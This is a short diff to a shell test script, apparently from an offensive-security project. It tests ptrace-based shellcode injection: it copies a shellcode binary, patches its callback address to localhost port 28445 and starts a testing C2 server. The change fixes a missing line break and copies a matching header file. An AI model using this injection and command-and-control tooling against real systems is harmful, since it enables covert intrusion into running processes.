@@ -57,8 +57,12 @@ fi
 # ----------------------------------------------------------------
 info "Scenario 2: ptrace injection (injector + live target)"
 
-# patch a second copy to a distinct port via patch_config (size-guarded)
-cp "$WORK/shadow.bin" "$WORK/inject_src.bin"python3 "$REPO_ROOT/shellcode/patch_config.py" "$WORK/inject_src.bin" \
+# patch a second copy to a distinct port via patch_config (size-guarded);
+# keep the header next to the copy with a matching stem so find_header()
+# picks it instead of any unrelated shellcode.h further up the path
+cp "$WORK/shadow.bin" "$WORK/inject_src.bin"
+cp "$WORK/shadow.h"  "$WORK/inject_src.h"
+python3 "$REPO_ROOT/shellcode/patch_config.py" "$WORK/inject_src.bin" \
     --ip 127.0.0.1 --port 28445 --out "$WORK/inject.bin" >/dev/null
 
 python3 "$REPO_ROOT/testing/c2_server.py" --port 28445 \
